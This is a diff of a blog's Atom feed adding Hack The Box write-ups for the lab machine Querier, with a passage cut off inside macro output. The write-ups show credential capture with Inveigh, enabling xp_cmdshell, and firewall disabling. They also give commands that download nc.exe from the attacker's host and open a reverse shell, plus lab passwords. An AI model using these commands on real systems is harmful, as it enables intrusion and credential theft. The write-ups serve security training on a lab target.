@@ -1,4 +1,316 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-15T16:07:52+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-22T16:21:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
+&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
+&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
+&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
+&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
+EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry><entry><title type="html">Hack The Box - Querier</title><link href="http://localhost:4000/hack-the-box/querier/" rel="alternate" type="text/html" title="Hack The Box - Querier" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-querier-retired-and-heres-my-write-up-about-it-it-was-a-great-windows-machine-covering-some-interesting-stuff-and-i-enjoyed-iti-wrote-two-posts-for-this-machine-first-one-solving-it-with-kali-and-the-other-one-solving-it-with-commando-vm-you-can-find-the-second-post-here-its-a-windows-box-and-its-ip-is-101010125-i-added-it-to-etchosts-as-querierhtb-lets-jump-right-in&quot;&gt;Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post &lt;a href=&quot;/hack-the-box/querier-2/&quot;&gt;here&lt;/a&gt;. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in!&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/querier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
+&lt;h4 id=&quot;we-need-to-list-the-shares-first-i-used-smbclient-&quot;&gt;We need to list the shares first. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient --list //querier.htb/ -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Reports         Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to querier.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;obviously-if-theres-an-anonymously-accessible-share-it-will-be-reports-lets-see-whats-in-there-&quot;&gt;Obviously if there’s an anonymously accessible share it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt;, Let’s see what’s in there :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# smbclient //querier.htb/Reports/ -U &quot;&quot;
+Enter WORKGROUP\'s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; ls
+  .                                   D        0  Mon Jan 28 18:23:48 2019
+  ..                                  D        0  Mon Jan 28 18:23:48 2019
+  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019
+
+                6469119 blocks of size 4096. 1608855 blocks available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;only-an-excel-file&quot;&gt;Only an Excel file.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; get &quot;Currency Volume Report.xlsm&quot;
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# file Currency\ Volume\ Report.xlsm 
+Currency Volume Report.xlsm: Microsoft Excel 2007+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;mssql-credentials-from-reportxlsm&quot;&gt;MSSQL Credentials from Report.xlsm&lt;/h3&gt;
+&lt;h4 id=&quot;i-checked-the-contents-of-the-excel-file-by-just-viewing-it-as-it-will-be-opened-with-the-archive-manager-&quot;&gt;I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;in-xl-i-found-vbaprojectbin-so-i-used-olevba-from-oletools-to-see-if-i-can-get-anything-&quot;&gt;in &lt;code class=&quot;highlighter-rouge&quot;&gt;xl&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;vbaProject.bin&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; from &lt;a href=&quot;https://www.decalage.info/python/oletools&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;oletools&lt;/code&gt;&lt;/a&gt; to see if I can get anything :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
+olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Currency Volume Report.xlsm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+' macro to pull data for client volume reports
+'
+' further testing required
+
+Private Sub Connect()
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn = New ADODB.Connection
